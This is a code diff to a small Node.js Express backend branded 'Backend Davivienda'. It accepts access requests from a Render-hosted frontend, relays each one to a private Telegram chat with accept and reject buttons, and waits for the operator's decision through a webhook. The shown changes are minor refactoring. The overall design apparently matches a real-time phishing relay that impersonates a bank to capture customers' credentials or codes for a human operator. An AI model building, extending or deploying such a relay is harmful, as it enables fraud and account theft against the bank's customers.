@@ -3,23 +3,30 @@ const cors = require('cors');
 const axios = require('axios');
 
 const app = express();
-const PORT = process.env.PORT || 3000; 
+const PORT = process.env.PORT || 3000;
 
 // --- CONFIGURACIÓN DE CORS ---
-// Permitimos explícitamente peticiones desde tu frontend en Render
+// Lee la URL del frontend desde las variables de entorno de Render
+const FRONTEND_URL = process.env.FRONTEND_URL || 'https://seguropgodv.onrender.com';
+
 const corsOptions = {
-    origin: 'https://seguropgodv.onrender.com',
+    origin: FRONTEND_URL,
     methods: ['GET', 'POST'],
     allowedHeaders: ['Content-Type', 'Authorization']
 };
 
-app.use(cors(corsOptions)); // Usamos la configuración
+app.use(cors(corsOptions));
 app.use(express.json());
 
 // --- CONFIGURACIÓN DE TELEGRAM ---
-// Recuerda configurar estas variables en el panel de Render (Environment Variables)
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
-const CHAT_ID = process.env.CHAT_ID; 
+// Lee las credenciales desde las variables de entorno de Render
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+
+// Validación temprana: si faltan variables, el servidor avisa
+if (!TELEGRAM_TOKEN || !CHAT_ID) {
+    console.error('⚠️ ERROR: Faltan las variables de entorno TELEGRAM_TOKEN o CHAT_ID');
+}
 
 const solicitudesPendientes = {};
 
@@ -58,10 +65,10 @@ app.post('/api/solicitar-acceso', async (req, res) => {
             reply_markup: keyboard
         });
 
-        res.json({ requestId: requestId });
+        res.json({ requestId });
 
     } catch (error) {
-        console.error('Error enviando a Telegram:', error.message);
+        console.error('Error enviando a Telegram:', error.response?.data || error.message);
         res.status(500).json({ error: 'Error interno del servidor' });
     }
 });
@@ -83,7 +90,7 @@ app.post('/api/telegram-webhook', (req, res) => {
     const { callback_query } = req.body;
 
     if (callback_query) {
-        const data = callback_query.data; 
+        const data = callback_query.data;
         const [accion, requestId] = data.split('_');
 
         if (solicitudesPendientes[requestId]) {
@@ -102,11 +109,12 @@ app.post('/api/telegram-webhook', (req, res) => {
     res.sendStatus(200);
 });
 
-// Ruta de prueba para saber que el back está vivo
+// Ruta de prueba
 app.get('/', (req, res) => {
     res.send('Backend Davivienda funcionando correctamente.');
 });
 
 app.listen(PORT, () => {
     console.log(`Servidor Backend corriendo en el puerto ${PORT}`);
+    console.log(`Frontend permitido: ${FRONTEND_URL}`);
 });
